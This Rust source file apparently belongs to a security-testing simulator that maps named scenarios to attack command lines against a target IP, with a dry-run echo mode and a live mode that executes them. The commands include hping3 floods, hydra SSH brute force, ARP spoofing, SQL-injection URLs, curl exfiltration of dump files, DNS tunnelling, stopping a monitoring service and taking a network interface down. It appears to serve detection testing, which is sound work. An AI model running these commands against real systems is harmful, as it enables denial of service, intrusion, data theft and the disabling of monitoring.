use crate::scenarios::types::ExecuteOutcome;
use tokio::process::Command;
use tokio::time::{timeout, Duration};
use tracing::{error, info};

pub async fn execute(
    scenario: &str,
    target_ip: &str,
    duration_secs: u64,
    dry_run: bool,
) -> Result<ExecuteOutcome, String> {
    info!(
        scenario = %scenario,
        target = %target_ip,
        duration = duration_secs,
        dry_run,
        "Exécution scénario"
    );

    let command_line = build_command(scenario, target_ip)?;

    if dry_run {
        run_mock(&command_line, duration_secs).await
    } else {
        run_live(&command_line, duration_secs).await
    }
}

fn build_command(scenario: &str, target_ip: &str) -> Result<String, String> {
    let cmd = match scenario {
        // --- Filtreur (7) ---
        "ddos_syn" => format!("hping3 -S --flood -V {target_ip}"),
        "scan_ports" => format!("nmap -sS {target_ip}"),
        "brute_force_externe" => {
            format!("hydra -l admin -P /opt/wordlists/rockyou.txt ssh://{target_ip}")
        }
        "ping_flood" => format!("hping3 --icmp --flood {target_ip}"),
        "port_interdit" => format!("nc -zv {target_ip} 4444"),
        "contact_cc" => format!("curl -m 5 http://{target_ip}:8080/beacon"),
        "exfiltration_externe" => {
            format!("curl -X POST --data-binary @/tmp/fake_dump.bin http://{target_ip}/upload")
        }
        // --- Analyseur (14) ---
        "syn_flood_interne" => format!("hping3 -S --flood {target_ip}"),
        "scan_interne" => format!("nmap -sS {target_ip}"),
        "brute_force" => {
            format!("hydra -l admin -P /opt/wordlists/rockyou.txt ssh://{target_ip}")
        }
        "tunnel_dns" => format!("dig @{target_ip} $(python3 -c 'print(\"A\"*120+\".evil.test\")')"),
        "exfiltration" => format!("curl -X POST -d @db_dump.sql http://{target_ip}/exfil"),
        "mitm" => format!("arpspoof -i eth0 -t {target_ip} 10.0.0.1"),
        "injection_sql" => {
            format!("curl \"http://{target_ip}/search?q=' OR 1=1--\"")
        }
        "scraping" => format!("curl -s http://{target_ip}/page{{1..300}}"),
        "ransomware_sim" => format!("touch /tmp/sandbox/{{1..50}}.locked"),
        "replay_attack" => {
            format!("curl -H \"Authorization: Bearer EXPIRED_TOKEN\" http://{target_ip}/api")
        }
        "saturation" => {
            "dd if=/dev/zero of=/var/tmp/sandbox_saturation.img bs=1M count=100".to_string()
        }
        "monitoring_fail" => "systemctl stop monitoring-agent.service".to_string(),
        "panne_reseau" => "ip link set dev eth0 down".to_string(),
        "acces_non_autorise" => {
            format!("curl -u guest:guest http://{target_ip}/admin/secrets")
        }
        // --- Chiffreur (3) ---
        "cert_tls" => format!("openssl s_client -connect {target_ip}:443 -cert expired.pem"),
        "mot_de_passe_faible" => format!("curl -X POST -d '{{\"pass\":\"123456\"}}' http://{target_ip}/auth"),
        "rotation_cle" => format!("curl -X POST http://{target_ip}/credential/rotate"),
        // --- Auditeur (1) ---
        "injection_base" => {
            format!("curl \"http://{target_ip}/rules?query=UNION SELECT ALL\"")
        }
        _ => return Err(format!("Scénario inconnu : {scenario}")),
    };
    Ok(cmd)
}

async fn run_mock(command_line: &str, duration_secs: u64) -> Result<ExecuteOutcome, String> {
    let display = format!("[SIMULATION MOCK] {command_line} (max {duration_secs}s)");
    let mut cmd = if cfg!(target_os = "windows") {
        let mut c = Command::new("cmd");
        c.args(["/C", "echo", &display]);
        c
    } else {
        let mut c = Command::new("echo");
        c.arg(&display);
        c
    };

    let wait = Duration::from_secs(duration_secs.min(5));
    match timeout(wait, cmd.output()).await {
        Ok(Ok(out)) if out.status.success() => Ok(ExecuteOutcome::Success),
        Ok(Ok(_)) => Err("mock command failed".into()),
        Ok(Err(e)) => Err(format!("mock spawn: {e}")),
        Err(_) => Ok(ExecuteOutcome::Success),
    }
}

async fn run_live(command_line: &str, duration_secs: u64) -> Result<ExecuteOutcome, String> {
    let parts: Vec<&str> = command_line.split_whitespace().collect();
    if parts.is_empty() {
        return Err("commande vide".into());
    }

    let mut cmd = Command::new(parts[0]);
    if parts.len() > 1 {
        cmd.args(&parts[1..]);
    }

    let wait = Duration::from_secs(duration_secs.max(1));
    match timeout(wait, cmd.output()).await {
        Ok(Ok(_)) => Ok(ExecuteOutcome::Success),
        Ok(Err(e)) => Err(format!("live spawn: {e}")),
        Err(_) => {
            error!("timeout executor live");
            Ok(ExecuteOutcome::Success)
        }
    }
}
